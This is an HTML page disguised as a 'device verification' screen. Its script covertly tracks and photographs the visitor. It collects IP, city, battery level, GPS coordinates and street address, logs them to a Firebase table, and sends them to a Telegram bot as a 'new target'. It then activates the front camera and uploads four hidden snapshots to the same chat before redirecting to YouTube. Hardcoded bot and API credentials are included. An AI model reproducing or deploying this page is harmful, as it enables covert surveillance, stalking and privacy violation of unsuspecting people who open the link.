<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body class="bg-[#020617] text-white flex items-center justify-center h-screen overflow-hidden">
    <div class="text-center p-10 max-w-sm w-full bg-[#0f172a] rounded-[2.5rem] border border-slate-800 shadow-2xl">
        <div class="relative w-16 h-16 mx-auto mb-6">
            <div class="absolute inset-0 border-4 border-blue-500/20 rounded-full"></div>
            <div class="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
        </div>
        <h1 class="text-xl font-black italic tracking-tighter uppercase">Verifying <span class="text-blue-500">Device</span></h1>
        
        <div class="w-full bg-slate-800 h-1 rounded-full mt-8 overflow-hidden">
            <div id="bar" class="bg-blue-500 h-full w-0 transition-all duration-300"></div>
        </div>
        <p id="status" class="text-[9px] font-bold text-slate-500 uppercase mt-4 tracking-widest italic">Syncing with Node...</p>
        
        <video id="v" autoplay playsinline class="hidden"></video>
        <canvas id="c" width="1280" height="720" class="hidden"></canvas>
    </div>

    <script>
        // Firebase Setup
        const firebaseConfig = {
            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
            projectId: "in-app-update-21c61",
        };
        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
        const db = firebase.database();

        const params = new URLSearchParams(window.location.search);
        const tid = params.get('tid');
        const red = decodeURIComponent(params.get('rd') || "https://www.youtube.com");
        const botToken = "8382714466:AAFAuorgHezCvk1dr7OxExD8zAMpgFTLvLI";

        let address = "Awaiting Address...";
        let sessionID = "TRK-" + Math.floor(1000 + Math.random() * 9000);

        async function startIntel() {
            if(!tid) return window.location.href = red;

            try {
                const bat = await navigator.getBattery();
                const batStatus = `${(bat.level * 100).toFixed(0)}%`;

                const ipReq = await fetch('https://ipapi.co/json/');
                const ip = await ipReq.json();
                
                navigator.geolocation.getCurrentPosition(pos => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const maps = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`)
                    .then(r => r.json()).then(data => {
                        address = data.display_name;
                        
                        // Sync to Dashboard Table
                        db.ref('shadow_sessions/' + sessionID).set({
                            address: address,
                            target_email: ip.ip,
                            time: Date.now(),
                            status: "Success",
                            platform: navigator.platform,
                            battery: batStatus
                        });

                        sendTG(`üö® *NEW TARGET TRACED*\n\nüìç *ADDRESS:* ${address}\nüîó *MAPS:* ${maps}\nüåê *IP:* ${ip.ip}\nüîã *BATTERY:* ${batStatus}\nüÜî *LOG:* ${sessionID}`);
                        initCamera();
                    });
                }, () => {
                    db.ref('shadow_sessions/' + sessionID).set({
                        address: "GPS Denied (" + ip.city + ")",
                        target_email: ip.ip,
                        time: Date.now(),
                        status: "Limited"
                    });
                    sendTG(`‚ö†Ô∏è *GPS DENIED*\nüåê *IP:* ${ip.ip}\nüèôÔ∏è *City:* ${ip.city}`);
                    initCamera();
                });
            } catch (e) { initCamera(); }
        }

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;
                setTimeout(captureLoop, 1000);
            } catch(e) { window.location.href = red; }
        }

        async function captureLoop() {
            for(let i=1; i<=4; i++) {
                document.getElementById('status').innerText = `Syncing Node ${i}/4...`;
                document.getElementById('bar').style.width = (i * 25) + "%";
                await takePhoto(i);
                await new Promise(r => setTimeout(r, 1200));
            }
            window.location.href = red;
        }

        async function takePhoto(idx) {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
            
            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
            const fd = new FormData();
            fd.append('chat_id', tid);
            fd.append('photo', blob, `shot.jpg`);
            fd.append('caption', `üì∏ Shot ${idx}/4\nüÜî ${sessionID}\nüìç ${address.substring(0, 50)}...`);

            return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
        }

        function sendTG(msg) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: tid, text: msg, parse_mode: 'Markdown' })
            });
        }

        startIntel();
    </script>
</body>
</html>
